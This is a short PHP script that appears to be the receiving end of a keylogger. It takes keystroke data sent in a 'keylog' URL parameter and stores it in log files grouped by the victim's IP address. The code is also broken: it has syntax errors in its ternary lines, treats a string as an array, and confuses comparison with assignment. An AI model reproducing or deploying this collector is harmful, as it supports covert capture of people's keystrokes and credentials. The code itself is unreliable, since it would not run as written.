<?php
function replace_a_line($data) {
   if (stristr($data, 'certain word')) {
     return "replaement line!\n";
   }
   return $data;
}
$ip = $_SERVER['REMOTE_ADDR'];
$stringData = $_GET["keylog"];
if($stringData == "undefined") {
  die();
}
else {
  $data = ('text/' . $ip . '/log.txt');
  
  (explode(':', $stringData)['0'] == "string") ? $data['0'] = $stringData; : null;
  (explode(':', $stringData)['0'] == "image") ? $data['1'] == $stringData; : null;

 file_put_contents('text/' . $ip . '/log.txt', implode('', $data));
}
?>
